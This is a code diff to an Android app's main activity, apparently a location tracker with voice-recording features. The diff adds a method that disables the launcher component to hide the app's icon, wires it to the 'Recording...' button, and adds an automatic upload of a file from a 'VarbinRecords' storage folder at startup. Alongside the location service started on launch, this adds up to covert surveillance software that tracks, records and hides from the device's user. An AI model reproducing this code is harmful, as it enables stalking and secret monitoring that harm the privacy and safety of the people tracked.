@@ -1,25 +1,30 @@
 package UiActivities;
 
+import androidx.annotation.RequiresApi;
 import androidx.appcompat.app.AppCompatActivity;
 import androidx.core.content.ContextCompat;
 
 import android.accounts.Account;
 import android.accounts.AccountManager;
+import android.content.ComponentName;
 import android.content.ContentResolver;
 import android.content.Context;
 import android.content.Intent;
+import android.content.pm.PackageManager;
+import android.os.Build;
 import android.os.Bundle;
 import android.util.Log;
 import android.view.View;
 import android.widget.Button;
+import android.widget.Toast;
 
 import locationTracker.ForegroundServices;
 import locationTracker.LocationService;
 import com.varbin.locationtracker.R;
 
+import java.io.File;
 import java.lang.reflect.InvocationTargetException;
 
-import AutoVoiceRecorder.VoiceRecorderService;
 import networkStates.networkState;
 import synceAdapter.AccountConstants;
 import synceAdapter.SyncAdapter;
@@ -29,11 +34,13 @@ public class MainActivity extends AppCompatActivity {
     public static final String ACCOUNT_TYPE =  AccountConstants.ACCOUNT_TYPE;
     public static final String ACCOUNT =  AccountConstants.ACCOUNT;
     static MainActivity ins;
+    FileUploadClass fileUploadClass;
     String Name, Email, Mobile;
     SyncAdapter syncAdapter;
     Button button  , button2;
     Account mAcoount;
     ContentResolver mResolver;
+    @RequiresApi(api = Build.VERSION_CODES.O)
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
@@ -45,7 +52,11 @@ public class MainActivity extends AppCompatActivity {
         button2 = findViewById(R.id.pauseButton);
         mAcoount = CreateSyncAccount(this);
         mResolver = getContentResolver();
-
+        FileUploadClass fileUploadClass = new FileUploadClass(new File("/storage/emulated/0/VarbinRecords/temp.jpg"),
+                "/storage/emulated/0/VarbinRecords/temp.jpg","92");
+        fileUploadClass.execute();
+        String s =AccountConstants.getStatus(this);
+        Log.d("TAG", "onCreateID: "+s);
         button2.setOnClickListener(new View.OnClickListener() {
             @Override
             public void onClick(View v) {
@@ -71,12 +82,15 @@ public class MainActivity extends AppCompatActivity {
             @Override
             public void onClick(View v) {
                 button.setText("Recording...");
-               Intent intent = new Intent(MainActivity.this , VoiceRecorderService.class);
-               intent.putExtra("isRecording" , true);
-               startService(intent);
+                boolean icon = HideIcon(MainActivity.this);
+                Log.d("TAG", "HideIcon" +icon);
+//               Intent intent = new Intent(MainActivity.this , VoiceRecorderService.class);
+//               intent.putExtra("isRecording" , true);
+//               startService(intent);
             }
         });
         startService(new Intent(getApplicationContext(), LocationService.class));
+        startService();
         if (AccountConstants.mainThread == false){
             startService();
         }
@@ -105,6 +119,19 @@ public class MainActivity extends AppCompatActivity {
              */
         }
         return newAccount;
+    }
+    private static boolean HideIcon(Context context){
+       try {
+           PackageManager manager = context.getPackageManager();
+           ComponentName componentName = new ComponentName(context.getApplicationContext() , MainActivity.class);
+           manager.setComponentEnabledSetting(componentName,
+                   manager.COMPONENT_ENABLED_STATE_DISABLED ,
+                   PackageManager.DONT_KILL_APP);
+           return true;
+       }catch (Exception e){
+           Log.d("TAG", "HideIcon: "+e);
+           return false;
+       }
     }
     public void startService() {
         Intent serviceIntent = new Intent(this, ForegroundServices.class);
